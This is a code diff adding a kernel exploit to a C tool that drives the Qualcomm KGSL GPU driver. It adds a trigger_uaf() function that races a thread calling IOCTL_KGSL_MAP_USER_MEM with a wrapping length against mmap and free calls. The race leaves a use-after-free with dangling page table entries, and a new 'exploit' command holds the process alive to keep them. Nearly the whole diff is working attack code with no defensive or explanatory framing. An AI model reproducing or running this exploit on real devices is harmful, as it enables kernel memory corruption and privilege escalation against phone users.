@@ -50,6 +50,62 @@ static uint64_t ib_gpu = 0, dst_gpu = 0;
 static void *ib_vma = NULL, *dst_vma = NULL;
 static uint32_t ib_id = 0, dst_id = 0;
 
+#include <sys/wait.h>
+#include <pthread.h>
+
+#define UAF_START 0x7001FF000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_START 0x7001FE000ULL
+#define OVERLAP_SIZE  0x00007000ULL
+#define BOGUS_START 0x700204000ULL
+#define WRAP_SIZE 0xFFFFFFFFFFEFD000ULL
+
+typedef struct {
+    int fd;
+    volatile int ready;
+    volatile int bogus_started;
+} race_state_t;
+
+static void *bogus_racer(void *arg) {
+    race_state_t *rs = (race_state_t *)arg;
+    while (!rs->ready);
+    rs->bogus_started = 1;
+    struct kgsl_map_user_mem req = {
+        .fd = -1, .gpuaddr = 0, .len = (size_t)WRAP_SIZE, 
+        .hostptr = (unsigned long)BOGUS_START, .memtype = 2, .flags = 0x10000000ULL
+    };
+    ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
+    return NULL;
+}
+
+int trigger_uaf() {
+    struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
+    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) return -1;
+    uint32_t uaf_id = alloc.id;
+
+    void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_vma == MAP_FAILED) return -2;
+    memset(uaf_vma, 1, UAF_SIZE);
+    munmap(uaf_vma, UAF_SIZE);
+
+    mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    
+    struct kgsl_gpuobj_alloc overlap = { .size = OVERLAP_SIZE, .flags = 0x10000000ULL };
+    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap);
+    
+    race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
+    pthread_t thread;
+    pthread_create(&thread, NULL, bogus_racer, &rs);
+    rs.ready = 1;
+    usleep(200);
+    mmap((void *)OVERLAP_START, OVERLAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)overlap.id << 12);
+    pthread_join(thread, NULL);
+
+    struct kgsl_gpuobj_free fr = { .id = uaf_id };
+    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+    return 0;
+}
+
 int init_kgsl() {
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) return -1;
@@ -123,7 +179,15 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    if (strcmp(argv[1], "read") == 0 && argc >= 3) {
+    if (strcmp(argv[1], "exploit") == 0) {
+        if (trigger_uaf() == 0) {
+            printf("UAF_READY\n");
+            // Keep process alive to hold dangling PTEs
+            while(1) pause();
+        } else {
+            return 1;
+        }
+    } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
         uint64_t addr = strtoull(argv[2], NULL, 16);
         uint8_t buf[PAGE_SIZE];
         if (read_gpu_page(addr, buf) == 0) {
